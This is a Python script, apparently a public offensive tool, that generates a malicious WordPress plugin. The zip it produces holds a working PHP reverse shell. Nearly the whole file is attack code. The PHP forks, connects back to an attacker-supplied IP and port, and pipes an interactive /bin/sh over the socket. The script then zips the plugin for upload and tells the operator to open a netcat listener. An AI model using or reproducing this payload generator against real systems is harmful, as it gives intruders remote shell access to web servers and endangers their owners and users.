#!/usr/bin/env python3 
import os
import sys
class bcolors:
    HEADER = '\033[95m'
    OKBLUE = '\033[94m'
    OKCYAN = '\033[96m'
    OKGREEN = '\033[92m'
    WARNING = '\033[93m'
    FAIL = '\033[91m'
    ENDC = '\033[0m'
    BOLD = '\033[1m'
    UNDERLINE = '\033[4m'
banner = f'''{bcolors.OKBLUE}

░██╗░░░░░░░██╗██████╗░██████╗░░██████╗██╗░░██╗███████╗██╗░░░░░██╗░░░░░
░██║░░██╗░░██║██╔══██╗██╔══██╗██╔════╝██║░░██║██╔════╝██║░░░░░██║░░░░░
░╚██╗████╗██╔╝██████╔╝██████╔╝╚█████╗░███████║█████╗░░██║░░░░░██║░░░░░
░░████╔═████║░██╔═══╝░██╔══██╗░╚═══██╗██╔══██║██╔══╝░░██║░░░░░██║░░░░░
░░╚██╔╝░╚██╔╝░██║░░░░░██║░░██║██████╔╝██║░░██║███████╗███████╗███████╗
░░░╚═╝░░░╚═╝░░╚═╝░░░░░╚═╝░░╚═╝╚═════╝░╚═╝░░╚═╝╚══════╝╚══════╝╚══════╝
    Tool by BoyFromFuture :- https://github.com/root-tanishq
'''
print(banner)
try:
    chk1 = sys.argv[1]
    chk2 = sys.argv[2]
    chk3 = sys.argv[3]
    payload_prefix = '''
    <?php
    /**
    * Plugin Name: Reverse Shell Plugin
    * Plugin URI:
    * Description: Reverse Shell Plugin
    * Version: 1.0
    * Author: BoyFromFuture
    * Author URI: https://github.com/root-tanishq
    */
    set_time_limit (0);
    $VERSION = "1.0";
    '''
    payload_address = f'''
    $ip = '{sys.argv[1]}';  
    $port = {int(sys.argv[2])};
    '''
    print(f"{bcolors.OKGREEN}[+]{bcolors.ENDC} Generating Payload")
    payload_suffix = '''
    $chunk_size = 1400;
    $write_a = null;
    $error_a = null;
    $shell = 'uname -a; w; id; /bin/sh -i';
    $daemon = 0;
    $debug = 0;

    if (function_exists('pcntl_fork')) {
        $pid = pcntl_fork();
        
        if ($pid == -1) {
            printit("ERROR: Can't fork");
            exit(1);
        }
        
        if ($pid) {
            exit(0);  // Parent exits
        }

        if (posix_setsid() == -1) {
            printit("Error: Can't setsid()");
            exit(1);
        }

        $daemon = 1;
    } else {
        printit("WARNING: Failed to daemonise.  This is quite common and not fatal.");
    }

    chdir("/");

    umask(0);

    $sock = fsockopen($ip, $port, $errno, $errstr, 30);
    if (!$sock) {
        printit("$errstr ($errno)");
        exit(1);
    }

    $descriptorspec = array(
    0 => array("pipe", "r"),  // stdin is a pipe that the child will read from
    1 => array("pipe", "w"),  // stdout is a pipe that the child will write to
    2 => array("pipe", "w")   // stderr is a pipe that the child will write to
    );

    $process = proc_open($shell, $descriptorspec, $pipes);

    if (!is_resource($process)) {
        printit("ERROR: Can't spawn shell");
        exit(1);
    }

    stream_set_blocking($pipes[0], 0);
    stream_set_blocking($pipes[1], 0);
    stream_set_blocking($pipes[2], 0);
    stream_set_blocking($sock, 0);

    printit("Successfully opened reverse shell to $ip:$port");

    while (1) {
        if (feof($sock)) {
            printit("ERROR: Shell connection terminated");
            break;
        }

        if (feof($pipes[1])) {
            printit("ERROR: Shell process terminated");
            break;
        }

        $read_a = array($sock, $pipes[1], $pipes[2]);
        $num_changed_sockets = stream_select($read_a, $write_a, $error_a, null);

        if (in_array($sock, $read_a)) {
            if ($debug) printit("SOCK READ");
            $input = fread($sock, $chunk_size);
            if ($debug) printit("SOCK: $input");
            fwrite($pipes[0], $input);
        }

        if (in_array($pipes[1], $read_a)) {
            if ($debug) printit("STDOUT READ");
            $input = fread($pipes[1], $chunk_size);
            if ($debug) printit("STDOUT: $input");
            fwrite($sock, $input);
        }

        if (in_array($pipes[2], $read_a)) {
            if ($debug) printit("STDERR READ");
            $input = fread($pipes[2], $chunk_size);
            if ($debug) printit("STDERR: $input");
            fwrite($sock, $input);
        }
    }

    fclose($sock);
    fclose($pipes[0]);
    fclose($pipes[1]);
    fclose($pipes[2]);
    proc_close($process);

    function printit ($string) {
        if (!$daemon) {
            print "$string\n";
        }
    }

    ?> 

    '''
    payload = payload_prefix + payload_address + payload_suffix
    open(f"{sys.argv[3]}.php",'w').write(payload)
    os.system(f"zip {sys.argv[3]}.zip {sys.argv[3]}.php > /dev/null")
    os.system(f"rm -f {sys.argv[3]}.php")
    print(f"{bcolors.OKGREEN}[+]{bcolors.ENDC} Payload Generated with the name of {sys.argv[3]}.zip")
    print(f"{bcolors.WARNING}[+]{bcolors.ENDC} Dont forget to use {bcolors.OKGREEN}# nc -nlvp {sys.argv[2]}{bcolors.ENDC}")
except:
    help = f'''{bcolors.FAIL}
[-] {bcolors.ENDC}Failed to Generate Payload{bcolors.WARNING}
Usage = python3 wp_rshell.py [IP] [PORT] [FILE NAME]
FILE NAME = Plese dont provide extension

Example:-
    # python3 wp_rshell.py 10.10.11.100 4455 payload{bcolors.ENDC}
    '''
    print(help)
